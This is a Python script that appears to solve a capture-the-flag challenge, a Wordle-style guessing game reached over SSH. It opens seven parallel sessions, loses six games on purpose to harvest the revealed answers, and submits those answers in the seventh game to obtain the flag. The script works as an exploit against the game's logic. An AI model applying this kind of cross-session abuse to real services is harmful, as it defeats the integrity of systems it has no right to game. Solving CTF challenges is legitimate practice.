#!/usr/bin/env python3
import pexpect
import time
import sys
import re
import threading

# thanks claude opus 4.5 i couldn't have written this without you .

class GameSession:
    def __init__(self, session_id):
        self.session_id = session_id
        self.child = None
        self.ready = False
        self.error = None
        self.correct_flag = None
        self.all_output = b''
    
    def connect(self):
        try:
            self.child = pexpect.spawn('ssh play@flagle', dimensions=(30, 140), timeout=60)
            self.ready = True
        except Exception as e:
            self.error = str(e)
    
    def read_all(self):
        output = b''
        while True:
            try:
                output += self.child.read_nonblocking(size=100000, timeout=0.5)
            except:
                break
        self.all_output += output
        return output
    
    def send(self, text):
        self.child.sendline(text)
    
    def close(self):
        if self.child:
            self.child.close()
    
    def get_correct_flag(self):
        decoded = self.all_output.decode('utf-8', errors='ignore')
        clean = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', decoded)
        clean = re.sub(r'\x1b\([AB]', '', clean)
        
        match = re.search(r'var:?\s*([0-9a-f]{32})', clean)
        if match:
            return match.group(1)
        return None

def connect_session(session):
    session.connect()

def play_and_lose(session):
    """Play game quickly with dummy guesses to get to GAME OVER"""
    try:
        time.sleep(3)
        session.read_all()
        
        guesses = [
            '0123456789abcdef0123456789abcdef',
            'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
            'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb',
            'cccccccccccccccccccccccccccccccc',
            'dddddddddddddddddddddddddddddddd',
            'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee',
        ]
        
        for guess in guesses:
            session.send(guess)
            time.sleep(1.5)
            session.read_all()
        
        time.sleep(2)
        try:
            session.child.expect(pexpect.EOF, timeout=5)
        except:
            pass
        
        if session.child.before:
            session.all_output += session.child.before
        
        session.correct_flag = session.get_correct_flag()
    except Exception as e:
        session.error = str(e)

def extract_flag_from_output(output):
    """Extract 32-char hex flag from output"""
    clean = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', output)
    clean = re.sub(r'\x1b\([AB]', '', clean)
    
    # Look for 32 hex chars at the end (after "Tegn: 0 1 2 3...")
    match = re.search(r'Tegn:[^a-f0-9]*([0-9a-f]{32})', clean)
    if match:
        return match.group(1)
    
    # Fallback: find any 32-char hex string near the end
    matches = re.findall(r'[0-9a-f]{32}', clean[-200:])
    if matches:
        return matches[-1]
    
    return None

def main():
    for run in range(5):
        print("\n=== Run {} ===".format(run))
        
        sessions = [GameSession(i) for i in range(7)]
        
        # Connect all simultaneously
        threads = []
        for session in sessions:
            t = threading.Thread(target=connect_session, args=(session,))
            threads.append(t)
        
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        active = [s for s in sessions if s.ready]
        print("Connected {} sessions".format(len(active)))
        
        if len(active) < 7:
            print("Not enough sessions, retrying...")
            for s in sessions:
                s.close()
            continue
        
        losers = sessions[:6]
        submitter = sessions[6]
        
        # Start loser games in threads
        loser_threads = []
        for session in losers:
            t = threading.Thread(target=play_and_lose, args=(session,))
            loser_threads.append(t)
        
        for t in loser_threads:
            t.start()
        
        # Wait for submitter to initialize
        time.sleep(3)
        submitter.read_all()
        
        # Wait for losers to finish
        for t in loser_threads:
            t.join()
        
        # Collect correct flags
        correct_flags = []
        for session in losers:
            if session.correct_flag:
                correct_flags.append(session.correct_flag)
                print("Session {} got flag: {}".format(session.session_id, session.correct_flag))
        
        # Remove duplicates
        unique_flags = []
        for f in correct_flags:
            if f not in unique_flags:
                unique_flags.append(f)
        
        print("Got {} unique flags to try".format(len(unique_flags)))
        
        if not unique_flags:
            for s in sessions:
                s.close()
            continue
        
        # Submit each flag on submitter session
        for i, flag in enumerate(unique_flags[:6]):
            print("Submitting guess {}: {}".format(i + 1, flag))
            submitter.send(flag)
            time.sleep(2)
            output = submitter.read_all()
            decoded = output.decode('utf-8', errors='ignore')
            
            # Check if connection closed (game won or lost)
            if 'Connection to flagle closed' in decoded:
                print("\nGame ended!")
                final_flag = extract_flag_from_output(submitter.all_output.decode('utf-8', errors='ignore'))
                if final_flag:
                    print("\n=== FLAG: {} ===".format(final_flag))
                for s in sessions:
                    s.close()
                sys.exit(0)
        
        # Get final output
        time.sleep(2)
        try:
            submitter.child.expect(pexpect.EOF, timeout=5)
        except:
            pass
        
        if submitter.child.before:
            submitter.all_output += submitter.child.before
        
        final_flag = extract_flag_from_output(submitter.all_output.decode('utf-8', errors='ignore'))
        if final_flag:
            print("\n=== FLAG: {} ===".format(final_flag))
            for s in sessions:
                s.close()
            sys.exit(0)
        
        for s in sessions:
            s.close()

if __name__ == '__main__':
    main()